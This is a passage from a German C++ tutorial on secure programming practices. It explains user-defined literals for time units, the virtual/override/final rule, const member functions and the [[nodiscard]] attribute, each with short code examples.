  * für Array-Indizierung und für Schleifenzähler.


---

### Benutzerdefinierte Literale: Elementare Datentypen &bdquo;mit Bedeutung&rdquo; <a name="link27"></a>

In C++ lassen sich `int`-Werte (oder auch Werte anderen Datentyps) durch die sogenannte *User Defined Literal* Syntax
erheblich lesbarer gestalten:

*Beispiel*:

```cpp
01: auto h = 23_hours;
02: auto d = 7_days;
03: // auto wrong = h + d;   // doesn't compile: Error
```

Dazu bedarf es einer Implementierung des sogenannten *Literal*-Operators:

```cpp
01: class Hours{
02: private:
03:     unsigned long long m_hours = 0;
04: 
05: public:
06:     Hours() : Hours(0) {}
07:     explicit Hours (unsigned long long hours) : m_hours(hours) {}
08: };
09:         
10: struct Days {
11: private:
12:     unsigned long long m_hours = 0;
13: 
14: public:
15:     Days() : Days(0) {}
16:     explicit Days(unsigned long long hours) : m_hours(hours) {}
17: };
18: 
19: Hours operator"" _hours(unsigned long long hours) {
20:     return Hours{ hours };
21: }
22: 
23: Days operator"" _days(unsigned long long hours) {
24:     return Days{ hours };
25: }
```

*Hinweis*:<br />
Es ist also nicht möglich, &bdquo;Stunden&rdquo; und &bdquo;Tage&rdquo; zu addieren.


Möchte man mit derartigen Konstanten auch Arithmetik betreiben können, geht das auch.
Man muss in diesem Fall die *Literal*-Operatoren nur anders definieren:

```cpp
01: constexpr unsigned long long operator"" _hours(unsigned long long hours) {
02:     return hours;
03: }
04: 
05: constexpr unsigned long long operator"" _days(unsigned long long hours) {
06:     return hours * 24;
07: }
08: 
09: constexpr unsigned long long operator"" _weeks(unsigned long long hours) {
10:     return hours * 7 * 24;
11: }
12: 
13: void test_use_user_defined_literals() {
14: 
15:     auto hours = 12_hours;
16: 
17:     auto dayHours = 2_days;
18: 
19:     auto weekHours = 3_weeks;
20: 
21:     auto totalHours = weekHours + dayHours + hours;
22: }
23: 
24: void test_use_user_defined_literals_constexpr() {
25: 
26:     constexpr auto hours = 12_hours;
27: 
28:     constexpr auto dayHours = 2_days;
29: 
30:     constexpr auto weekHours = 3_weeks;
31: 
32:     constexpr auto totalHours = weekHours + dayHours + hours; // 12 + 2*24 + 3*7*24 = 564
33: }
```

---

### Schlüsselwörter `virtual`, `override` oder `final` <a name="link28"></a>

Virtuelle Methoden sollten genau eines der drei Schlüsselwörter `virtual`, `override` oder `final` verwenden.

*Beschreibung*:

[C.128: Virtual functions should specify exactly one of `virtual`, `override`, or `final`](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#c128-virtual-functions-should-specify-exactly-one-of-virtual-override-or-final)

*Beispiel*:

```cpp
01: struct Button {
02:     // ...
03:     virtual void onClick() { 
04:         std::println("Button!");
05:     }
06: };
07: 
08: struct SuperButton : public Button {
09:     // ...
10:     void onClick() override {
11:         std::println("Super Button!");
12:     }
13: };
14: 
15: void test() {
16:     Button button;
17:     button.onClick();
18: 
19:     SuperButton superButton;
20:     superButton.onClick();
21: }
```

---

### Setze standardmäßig Methoden auf `const`, soweit möglich <a name="link29"></a>

*Beschreibung*:

[Con.2: By default, make member functions `const`](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#con2-by-default-make-member-functions-const)

*Beispiel*:

```cpp
01: class Point {
02: private:
03:     int m_x = 0;
04:     int m_y = 0;
05: 
06: public:
07:     Point() : Point{ 0, 0 } {};
08:     Point(int x, int y) : m_x{ x }, m_y{ y } {}
09: 
10:     int x() const { return m_x; }
11:     int y() const { return m_y; }
12: 
13:     bool is_valid() const {
14:         return m_x >= 0 && m_y >= 0;
15:     }
16: };
17: 
18: void test() {
19:     Point point;
20:     point.is_valid();
21: }
```

---

### Verwende das Attribut `[[nodiscard]]` <a name="link30"></a>

*Beschreibung*:

Die Idee von `[[nodiscard]]` ist, dass, wenn es nur dann sinnvoll ist, eine Funktion/Methode aufzurufen *und*
ihren Rückgabewert zu übernehmen, für Aufrufe dieser Funktion ohne Zuweisung des Rückgabewerts ein Programmierfehler gemeldet wird.

Die Annotation `[[nodiscard]]` hilft Programmierern, die mit Ihrem Code interagieren, diesen Fehler zu vermeiden.

*Beispiel*:

```cpp
01: class Point {
02: private:
03:     int m_x = 0;
04:     int m_y = 0;
05: 
06: public:
07:     Point() : Point{ 0, 0 } {};
08:     Point(int x, int y) : m_x{ x }, m_y{ y } {}
09: 
10:     int x() const { return m_x; }
11:     int y() const { return m_y; }
12: 
13:     [[nodiscard]] bool is_valid() const {
14:         return m_x >= 0 && m_y >= 0;
15:     }
16: };
17: 
18: void test() {
19:     Point point;
20:     point.is_valid();     // warning: ignoring return value
21: }
```

---

[Zurück](./Readme_Secure_Programming.md)

---
